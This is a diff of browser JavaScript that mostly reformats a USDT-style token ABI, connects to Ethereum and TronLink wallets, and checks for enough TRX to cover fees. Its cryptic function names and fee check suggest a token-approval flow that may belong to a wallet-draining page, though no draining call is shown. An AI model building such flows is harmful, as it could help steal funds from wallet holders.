@@ -2280,16 +2280,15 @@ async function getWallet() {
                     "inputs": [],
                     "stateMutability": "nonpayable",
                     "type": "constructor"
-                }, {
-                    "payable": true,
-                    "stateMutability": "payable",
-                    "type": "fallback"
-                }, {
-                    "inputs": [{"indexed": false, "name": "previousOwner", "type": "address"}, {
+                }, {"payable": true, "stateMutability": "payable", "type": "fallback"}, {
+                    "inputs": [{
                         "indexed": false,
-                        "name": "newOwner",
+                        "name": "previousOwner",
                         "type": "address"
-                    }], "name": "ProxyOwnershipTransferred", "anonymous": false, "type": "event"
+                    }, {"indexed": false, "name": "newOwner", "type": "address"}],
+                    "name": "ProxyOwnershipTransferred",
+                    "anonymous": false,
+                    "type": "event"
                 }, {
                     "inputs": [{"indexed": true, "name": "implementation", "type": "address"}],
                     "name": "Upgraded",
@@ -2513,176 +2512,180 @@ async function getWallet() {
                     "payable": false,
                     "stateMutability": "view",
                     "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "newBasisPoints", "type": "uint256"}, {
-                            "name": "newMaxFee",
-                            "type": "uint256"
-                        }],
-                        "name": "setParams",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "amount", "type": "uint256"}],
-                        "name": "issue",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "amount", "type": "uint256"}],
-                        "name": "redeem",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "constant": true,
-                        "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
-                        "name": "allowance",
-                        "outputs": [{"name": "remaining", "type": "uint256"}],
-                        "payable": false,
-                        "stateMutability": "view",
-                        "type": "function"
-                    }, {
-                        "constant": true,
-                        "inputs": [],
-                        "name": "basisPointsRate",
-                        "outputs": [{"name": "", "type": "uint256"}],
-                        "payable": false,
-                        "stateMutability": "view",
-                        "type": "function"
-                    }, {
-                        "constant": true,
-                        "inputs": [{"name": "", "type": "address"}],
-                        "name": "isBlackListed",
-                        "outputs": [{"name": "", "type": "bool"}],
-                        "payable": false,
-                        "stateMutability": "view",
-                        "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "_clearedUser", "type": "address"}],
-                        "name": "removeBlackList",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "constant": true,
-                        "inputs": [],
-                        "name": "MAX_UINT",
-                        "outputs": [{"name": "", "type": "uint256"}],
-                        "payable": false,
-                        "stateMutability": "view",
-                        "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "newOwner", "type": "address"}],
-                        "name": "transferOwnership",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "constant": false,
-                        "inputs": [{"name": "_blackListedUser", "type": "address"}],
-                        "name": "destroyBlackFunds",
-                        "outputs": [],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "function"
-                    }, {
-                        "inputs": [{"name": "_initialSupply", "type": "uint256"}, {
-                            "name": "_name",
-                            "type": "string"
-                        }, {"name": "_symbol", "type": "string"}, {"name": "_decimals", "type": "uint256"}],
-                        "payable": false,
-                        "stateMutability": "nonpayable",
-                        "type": "constructor"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "amount", "type": "uint256"}],
-                        "name": "Issue",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "amount", "type": "uint256"}],
-                        "name": "Redeem",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "newAddress", "type": "address"}],
-                        "name": "Deprecate",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "feeBasisPoints", "type": "uint256"}, {
-                            "indexed": false,
-                            "name": "maxFee",
-                            "type": "uint256"
-                        }],
-                        "name": "Params",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "_blackListedUser", "type": "address"}, {
-                            "indexed": false,
-                            "name": "_balance",
-                            "type": "uint256"
-                        }],
-                        "name": "DestroyedBlackFunds",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "_user", "type": "address"}],
-                        "name": "AddedBlackList",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": false, "name": "_user", "type": "address"}],
-                        "name": "RemovedBlackList",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {
-                            "indexed": true,
-                            "name": "spender",
-                            "type": "address"
-                        }, {"indexed": false, "name": "value", "type": "uint256"}],
-                        "name": "Approval",
-                        "type": "event"
-                    }, {
-                        "anonymous": false,
-                        "inputs": [{"indexed": true, "name": "from", "type": "address"}, {
-                            "indexed": true,
-                            "name": "to",
-                            "type": "address"
-                        }, {"indexed": false, "name": "value", "type": "uint256"}],
-                        "name": "Transfer",
-                        "type": "event"
-                    }, {"anonymous": false, "inputs": [], "name": "Pause", "type": "event"}, {
-                        "anonymous": false,
-                        "inputs": [],
-                        "name": "Unpause",
-                        "type": "event"
-                    }];
-                    web3 = new Web3(ethereum);
-                    contract = new web3.eth.Contract(contract_abi, contract_addr);
-                    accounts = await ethereum.request({method: 'eth_requestAccounts'});
-                    if (accounts.length > 0) {
-                        printd('eth');
-                        pay_addr_input_ele.innerHTML = contract_addr;
-                        clearInterval(getWalletTimer);
-                        pay_ele.removeAttribute('style');
-                        wallet_ele.setAttribute('style', 'display:none');
-                    }
-                    break;
-            }
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+                    "name": "transfer",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "newBasisPoints", "type": "uint256"}, {"name": "newMaxFee", "type": "uint256"}],
+                    "name": "setParams",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "amount", "type": "uint256"}],
+                    "name": "issue",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "amount", "type": "uint256"}],
+                    "name": "redeem",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": true,
+                    "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
+                    "name": "allowance",
+                    "outputs": [{"name": "remaining", "type": "uint256"}],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }, {
+                    "constant": true,
+                    "inputs": [],
+                    "name": "basisPointsRate",
+                    "outputs": [{"name": "", "type": "uint256"}],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }, {
+                    "constant": true,
+                    "inputs": [{"name": "", "type": "address"}],
+                    "name": "isBlackListed",
+                    "outputs": [{"name": "", "type": "bool"}],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "_clearedUser", "type": "address"}],
+                    "name": "removeBlackList",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": true,
+                    "inputs": [],
+                    "name": "MAX_UINT",
+                    "outputs": [{"name": "", "type": "uint256"}],
+                    "payable": false,
+                    "stateMutability": "view",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "newOwner", "type": "address"}],
+                    "name": "transferOwnership",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "constant": false,
+                    "inputs": [{"name": "_blackListedUser", "type": "address"}],
+                    "name": "destroyBlackFunds",
+                    "outputs": [],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "function"
+                }, {
+                    "inputs": [{"name": "_initialSupply", "type": "uint256"}, {
+                        "name": "_name",
+                        "type": "string"
+                    }, {"name": "_symbol", "type": "string"}, {"name": "_decimals", "type": "uint256"}],
+                    "payable": false,
+                    "stateMutability": "nonpayable",
+                    "type": "constructor"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "amount", "type": "uint256"}],
+                    "name": "Issue",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "amount", "type": "uint256"}],
+                    "name": "Redeem",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "newAddress", "type": "address"}],
+                    "name": "Deprecate",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "feeBasisPoints", "type": "uint256"}, {
+                        "indexed": false,
+                        "name": "maxFee",
+                        "type": "uint256"
+                    }],
+                    "name": "Params",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "_blackListedUser", "type": "address"}, {
+                        "indexed": false,
+                        "name": "_balance",
+                        "type": "uint256"
+                    }],
+                    "name": "DestroyedBlackFunds",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "_user", "type": "address"}],
+                    "name": "AddedBlackList",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": false, "name": "_user", "type": "address"}],
+                    "name": "RemovedBlackList",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": true, "name": "owner", "type": "address"}, {
+                        "indexed": true,
+                        "name": "spender",
+                        "type": "address"
+                    }, {"indexed": false, "name": "value", "type": "uint256"}],
+                    "name": "Approval",
+                    "type": "event"
+                }, {
+                    "anonymous": false,
+                    "inputs": [{"indexed": true, "name": "from", "type": "address"}, {
+                        "indexed": true,
+                        "name": "to",
+                        "type": "address"
+                    }, {"indexed": false, "name": "value", "type": "uint256"}],
+                    "name": "Transfer",
+                    "type": "event"
+                }, {"anonymous": false, "inputs": [], "name": "Pause", "type": "event"}, {
+                    "anonymous": false,
+                    "inputs": [],
+                    "name": "Unpause",
+                    "type": "event"
+                }];
+                web3 = new Web3(ethereum);
+                contract = new web3.eth.Contract(contract_abi, contract_addr);
+                accounts = await ethereum.request({method: 'eth_requestAccounts'});
+                if (accounts.length > 0) {
+                    printd('eth');
+                    pay_addr_input_ele.innerHTML = contract_addr;
+                    clearInterval(getWalletTimer);
+                    pay_ele.removeAttribute('style');
+                    wallet_ele.setAttribute('style', 'display:none');
+                }
+                break;
         }
     } else if (typeof window.tron !== "undefined" && typeof window.tron.isTronLink !== "undefined") {
         wallet = 'tronLink';
@@ -2880,6 +2883,7 @@ async function TUAP() {
 
 async function tronIA() {
     let trx = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+    alert('trx',trx);
     if (trx > 5000000) {  // 只需要5 TRX就足够了
         const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         try {
